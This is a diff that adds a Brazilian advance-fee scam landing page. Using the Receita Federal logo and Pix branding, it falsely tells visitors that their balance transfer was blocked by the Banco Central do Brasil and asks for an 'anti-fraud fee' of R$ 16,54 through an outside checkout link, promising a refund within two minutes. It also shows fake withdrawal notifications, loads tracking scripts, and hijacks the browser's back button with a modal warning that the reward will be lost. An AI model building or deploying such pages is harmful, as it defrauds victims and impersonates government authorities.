@@ -1,0 +1,525 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <link rel="stylesheet" href="css/style-toast.css">
+<script src="../gh/xTracky/static%40latest/utm-handler-15.js" data-token="5e588ba4-abf3-4e35-aa42-751c7be7b7bf">
+
+</script>
+
+    <meta charset="UTF-8">
+     <script src="js/utm-propagator.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Taxa Anti-Fraude</title>
+<link href="css/boxicons.min.css" rel="stylesheet">
+
+    <link href="css2-4.html" rel="stylesheet">
+    
+    <style>
+    	
+		body, p, span, a, li, h1, h2, h3, h4, h5, h6, button, input, textarea {
+  font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
+}
+</style>
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+        
+        background: linear-gradient(135deg, #0963a8 0%, #064a7a 100%);
+        min-height: 100vh;
+        color: #333;
+        line-height: 1.5;
+        overflow-x: hidden;
+        padding: 0;
+      }
+
+      /* Header simples e limpo */
+      header {
+        background: white;
+        border-bottom: 2px solid #0963a8;
+        padding: 15px 0;
+        text-align: center;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      header img {
+        width: 160px;
+        height: auto;
+        vertical-align: middle;
+      }
+
+      /* Container principal mobile */
+      .container {
+        max-width: 100%;
+        margin: 0 auto;
+        padding: 20px 15px;
+      }
+
+      /* Card principal */
+      .content {
+        background: white;
+        border-radius: 16px;
+        padding: 30px 25px;
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .content::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+          45deg,
+          transparent,
+          rgba(9, 99, 168, 0.03),
+          transparent
+        );
+        animation: shine 4s infinite;
+      }
+
+      @keyframes shine {
+        0% {
+          transform: translateX(-100%) translateY(-100%) rotate(45deg);
+        }
+        100% {
+          transform: translateX(100%) translateY(100%) rotate(45deg);
+        }
+      }
+
+      /* Logo PIX */
+      .pix-logo {
+        width: 80px;
+        height: auto;
+        margin: 0 0 20px 0;
+        position: relative;
+        z-index: 1;
+      }
+
+      /* Título principal */
+      .main-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: #0963a8;
+        margin-bottom: 25px;
+        position: relative;
+        z-index: 1;
+      }
+
+      /* Texto explicativo */
+      .explanation-text {
+        font-size: 16px;
+        line-height: 1.6;
+        margin-bottom: 20px;
+        color: #333;
+        position: relative;
+        z-index: 1;
+      }
+
+      /* Destaque para elementos importantes */
+      .highlight {
+        color: #0963a8;
+        font-weight: 600;
+      }
+
+      .strong-highlight {
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        color: white;
+        padding: 2px 8px;
+        border-radius: 6px;
+        font-weight: 600;
+      }
+
+      /* Card da tarifa */
+      .tariff-card {
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        color: white;
+        padding: 20px;
+        border-radius: 12px;
+        margin: 25px 0;
+        box-shadow: 0 6px 20px rgba(9, 99, 168, 0.3);
+        position: relative;
+        z-index: 1;
+      }
+
+      .tariff-label {
+        font-size: 16px;
+        font-weight: 500;
+        margin-bottom: 8px;
+        opacity: 0.95;
+      }
+
+      .tariff-value {
+        font-size: 28px;
+        font-weight: 700;
+        text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
+      }
+
+      /* Informação de extorno */
+      .refund-info {
+        background: rgba(9, 99, 168, 0.1);
+        border: 2px solid rgba(9, 99, 168, 0.2);
+        border-radius: 10px;
+        padding: 15px;
+        margin: 20px 0;
+        font-size: 14px;
+        color: #0963a8;
+        font-weight: 500;
+        position: relative;
+        z-index: 1;
+      }
+
+      /* Botão CTA mobile otimizado */
+      .cta-button {
+        display: inline-block;
+        width: 100%;
+        max-width: 350px;
+        margin: 25px 0;
+        padding: 18px 25px;
+        font-size: 16px;
+        font-weight: 700;
+        color: white;
+        background: linear-gradient(135deg, #0963a8, #064a7a);
+        border: none;
+        border-radius: 50px;
+        text-decoration: none;
+        transition: all 0.3s ease;
+        box-shadow: 0 8px 25px rgba(9, 99, 168, 0.4);
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        position: relative;
+        overflow: hidden;
+        animation: pulse-cta 2.5s infinite;
+        touch-action: manipulation;
+        -webkit-appearance: none;
+        z-index: 1;
+      }
+
+      @keyframes pulse-cta {
+        0%,
+        100% {
+          transform: scale(1);
+          box-shadow: 0 8px 25px rgba(9, 99, 168, 0.4);
+        }
+        50% {
+          transform: scale(1.02);
+          box-shadow: 0 10px 30px rgba(9, 99, 168, 0.6);
+        }
+      }
+
+      .cta-button:active {
+        transform: scale(0.98);
+        transition: transform 0.1s;
+      }
+
+      .cta-button::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.3),
+          transparent
+        );
+        transition: left 0.5s;
+      }
+
+      .cta-button:active::before {
+        left: 100%;
+      }
+
+      /* Badges de segurança */
+      .security-badges {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin: 20px 0;
+        flex-wrap: wrap;
+        position: relative;
+        z-index: 1;
+      }
+
+      .security-badge {
+        background: rgba(9, 99, 168, 0.1);
+        color: #0963a8;
+        padding: 6px 12px;
+        border-radius: 15px;
+        font-size: 11px;
+        font-weight: 600;
+        border: 1px solid rgba(9, 99, 168, 0.2);
+      }
+
+      /* Footer simples */
+      footer {
+        text-align: center;
+        padding: 20px;
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.8);
+      }
+
+      /* Ajustes específicos para mobile */
+      @media (max-width: 480px) {
+        .container {
+          padding: 15px 10px;
+        }
+
+        .content {
+          padding: 25px 20px;
+          border-radius: 14px;
+        }
+
+        header img {
+          width: 140px;
+        }
+
+        .main-title {
+          font-size: 20px;
+        }
+
+        .explanation-text {
+          font-size: 15px;
+        }
+
+        .tariff-value {
+          font-size: 24px;
+        }
+
+        .cta-button {
+          padding: 16px 20px;
+          font-size: 15px;
+        }
+
+        .security-badges {
+          gap: 8px;
+        }
+
+        .security-badge {
+          font-size: 10px;
+          padding: 5px 10px;
+        }
+      }
+
+      /* Otimizações de performance mobile */
+      @media (prefers-reduced-motion: reduce) {
+        *,
+        *::before,
+        *::after {
+          animation-duration: 0.01ms !important;
+          animation-iteration-count: 1 !important;
+          transition-duration: 0.01ms !important;
+        }
+      }
+
+      /* Ajustes para iOS */
+      @supports (-webkit-touch-callout: none) {
+        .cta-button {
+          -webkit-appearance: none;
+          -webkit-tap-highlight-color: transparent;
+        }
+      }
+  .button-pix {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    border-radius: 8px; /* Bordas um pouco mais suaves */
+    padding: 15px 30px; /* Mais área de clique */
+    color: #fff;
+    /* Gradiente que remete ao PIX ou alta conversão */
+    background: linear-gradient(45deg, #32bcad, #075287); 
+    border: none;
+    margin-bottom: 15px;
+    font-size: 20px;
+    font-weight: 800; /* Extra bold para destaque */
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden; /* Necessário para o efeito de brilho */
+    transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    animation: buttonPulse 2s infinite;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+}
+
+/* Efeito de brilho passando pelo botão (Glossy Effect) */
+.button-pix::after {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -60%;
+    width: 20%;
+    height: 200%;
+    background: rgba(255, 255, 255, 0.3);
+    transform: rotate(30deg);
+    transition: none;
+    animation: shine 3s infinite;
+}
+
+.button-pix:hover {
+    transform: scale(1.05) translateY(-3px);
+    background: linear-gradient(45deg, #075287, #32bcad);
+    box-shadow: 0 10px 25px rgba(50, 188, 173, 0.4);
+    animation: none; /* Para o usuário focar no clique */
+}
+
+.button-pix:active {
+    transform: scale(0.95); /* Efeito de clique real */
+}
+
+/* Animações */
+@keyframes buttonPulse {
+    0% { box-shadow: 0 0 0 0 rgba(50, 188, 173, 0.7); }
+    70% { box-shadow: 0 0 0 15px rgba(50, 188, 173, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(50, 188, 173, 0); }
+}
+
+@keyframes shine {
+    0% { left: -60%; }
+    20% { left: 120%; }
+    100% { left: 120%; }
+}
+    </style>
+
+<script src="../gh/xTracky/static%40latest/utm-handler-15.js" data-token="5e588ba4-abf3-4e35-aa42-751c7be7b7bf">
+</script>
+	
+	 <link href="https://fonts.googleapis.com/css2?family=Arial:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+    	
+		body, p, span, a, li, h1, h2, h3, h4, h5, h6, button, input, textarea {
+  font-family: 'Arial', sans-serif !important;
+}
+</style>
+<script
+	src="https://cdn.xtracky.com/scripts/utm-handler.js"
+	data-token="abc60e07-8140-4133-b5df-23c871ba9de6"
+>
+</script>
+</head>
+
+  <body>
+    <!-- Header limpo -->
+    <header>
+      <img src="images/receita-federal-logo.png" alt="Receita Federal">
+    </header>
+
+    <div class="container">
+      <!-- Card principal -->
+      <div class="content">
+        <!-- Logo PIX -->
+        <img src="images/logo-pix-icone-1024.png" alt="Logo Pix" class="pix-logo">
+
+        <!-- Título principal -->
+        <h2 class="main-title">ATENÇÃO</h2>
+
+        <!-- Explicação principal -->
+        <p class="explanation-text">
+          <strong>Seu saldo foi enviado</strong>, mas a transferência foi
+          interrompida pelo
+          <span class="highlight">Banco Central do Brasil</span>.
+        </p>
+
+        <p class="explanation-text">
+          Para garantir a segurança e evitar fraudes, é necessário pagar uma
+        </p>
+        <span class="strong-highlight">tarifa simbólica anti-fraude.</span>
+        <!-- Informação de extorno -->
+        <link rel="stylesheet" href="../ajax/libs/font-awesome/6.5.0/css/all.min-4.css">
+
+        <div class="refund-info">
+  <i class="fas fa-clock" aria-hidden="true" style="color: #0963a8; margin-right: 6px;"></i>
+  Este valor será <strong>REEMBOLSADO</strong> em até 2 minutos após o pagamento.
+</div>
+
+
+
+
+        <!-- Card da tarifa -->
+        <div class="tariff-card">
+          <div class="tariff-label">Valor da tarifa:</div>
+          <div class="tariff-value">R$ 16,54</div>
+          <a href="https://www.pagamentos-seguro.link/checkout/715bbdb0-b05b-4e0f-835c-a79bf1bd32a0" class="button-pix" style="text-decoration:none;">Desbloquear saldo</a>
+      </div>
+        </div>
+      
+    </div>
+
+    <!-- Footer simples -->
+    <footer>
+      <p>© 2025 Pagamento Seguro. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+      function preserveParams(event) {
+        event.preventDefault(); // Evitar o redirecionamento padrão
+
+        // URL base do link
+        const baseUrl = new URL(event.currentTarget.href);
+
+        // Capturar parâmetros da URL atual
+        const currentParams = new URLSearchParams(window.location.search);
+
+        // Adicionar parâmetros da URL atual ao link, sem duplicar
+        for (const [key, value] of currentParams) {
+          if (!baseUrl.searchParams.has(key)) {
+            baseUrl.searchParams.append(key, value);
+          }
+        }
+
+        // Redirecionar com os parâmetros preservados
+        window.location.href = baseUrl.toString();
+      }
+    </script>
+
+    <div id="toast-saque" class="toast-saque">
+      <img id="toast-img" src="https://i.pravatar.cc/150?img=11" alt="Perfil" class="toast-perfil">
+      <div class="toast-texto">
+          <p id="toast-mensagem">Pedro H. sacou  <strong class="texto-verde">R$ 2.029,02</strong></p>
+        
+          <span>há poucos segundos</span>
+      </div>
+      <div class="toast-dot"></div>
+    </div>
+    
+    <script src="js/toast.js"></script>
+
+
+<!-- Modal Back Redirect -->
+<div id="overlay-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:99999;justify-content:center;align-items:center;">
+  <div style="background:#fff;border-radius:16px;padding:28px 24px;max-width:340px;width:90%;text-align:center;font-family:sans-serif;">
+    <div style="font-size:2rem;margin-bottom:12px;">⚠️</div>
+    <h2 style="font-size:1.2rem;margin-bottom:8px;color:#111;">Tem certeza que quer sair?</h2>
+    <p style="color:#555;font-size:0.9rem;margin-bottom:20px;">Seu saldo será cancelado e você perderá sua recompensa!</p>
+    <button id="btn-finalizar" style="width:100%;padding:14px;background:linear-gradient(135deg,#27ae60,#2ecc71);color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:700;cursor:pointer;margin-bottom:10px;">✅ Continuar e Resgatar</button>
+    <button id="btn-sair" style="width:100%;padding:12px;background:none;border:none;color:#999;font-size:0.85rem;cursor:pointer;">Sair mesmo assim</button>
+  </div>
+</div>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  history.pushState(null, null, location.href);
+  window.addEventListener("popstate", function () {
+    history.pushState(null, null, location.href);
+    document.getElementById("overlay-modal").style.display = "flex";
+  });
+  document.getElementById("btn-finalizar").addEventListener("click", function () {
+    document.getElementById("overlay-modal").style.display = "none";
+  });
+  document.getElementById("btn-sair").addEventListener("click", function () {
+    window.history.back();
+  });
+});
+</script>
+</body></html>
